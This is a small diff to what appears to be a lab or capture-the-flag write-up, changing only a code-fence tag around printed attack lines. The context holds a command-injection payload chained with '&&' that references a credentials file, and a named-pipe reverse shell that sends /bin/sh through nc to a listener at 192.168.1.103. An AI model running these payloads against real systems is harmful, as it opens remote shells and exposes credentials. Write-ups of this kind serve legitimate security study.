@@ -236,7 +236,7 @@ cmd=ls /tmp/backpipe p  %26%26 /home/nitish/.dev/creds.txt
 ```
 
 Followed by this command to connect to my nc listener:
-```http
+```
 cmd=/bin/sh 0</tmp/backpipe | nc 192.168.1.103 443 1>/tmp/backpipe  %26%26 /home/nitish/.dev/creds.txt
 ```
 
